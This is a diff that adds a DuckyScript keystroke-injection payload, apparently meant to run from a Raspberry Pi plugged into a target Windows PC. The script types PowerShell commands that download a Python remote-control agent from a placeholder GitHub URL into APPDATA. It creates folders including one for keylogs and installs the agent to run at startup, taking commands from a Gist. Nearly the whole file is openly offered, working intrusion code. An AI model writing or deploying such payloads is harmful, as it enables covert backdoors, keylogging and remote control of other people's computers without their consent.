@@ -1,0 +1,47 @@
+REM ============================================================
+REM   DuckyAgent Installer - Drops remote control agent on target PC
+REM   This script installs ducky_agent.py and sets it to run on boot
+REM   Then points it at a GitHub Gist for remote command delivery
+REM
+REM   USAGE: Run this from your Pi when plugged into a target PC.
+REM          Before running, update the URLs below!
+REM ============================================================
+
+DELAY 2000
+
+STRING powershell -NoProfile -Command "$ProgressPreference = 'SilentlyContinue'; $env:APPDATA"
+ENTER
+DELAY 1000
+
+STRING mkdir "$env:APPDATA\DuckyAgent" -Force
+ENTER
+DELAY 500
+
+STRING cd "$env:APPDATA\DuckyAgent"
+ENTER
+DELAY 200
+
+REM Download the agent from your GitHub repo or server
+STRING powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YOUR_USERNAME/your_repo/main/DuckyScripts/ducky_agent.py' -OutFile 'ducky_agent.py'"
+ENTER
+DELAY 5000
+
+REM Create required directories
+STRING mkdir "$env:APPDATA\DuckyAgent\.processed" -Force
+ENTER
+STRING mkdir "$env:APPDATA\DuckyAgent\logs" -Force
+ENTER
+STRING mkdir "$env:APPDATA\DuckyAgent\keylog" -Force
+ENTER
+STRING mkdir "$env:APPDATA\DuckyAgent\scripts" -Force
+ENTER
+
+REM Install the agent (adds to Windows startup)
+STRING pythonw ducky_agent.py --install
+ENTER
+DELAY 3000
+
+REM Verify installation
+STRING if (Test-Path "$env:APPDATA\DuckyAgent\ducky_agent.py") { echo "DuckyAgent installed successfully!" } else { echo "Installation failed." }
+ENTER
+SLEEP 2000
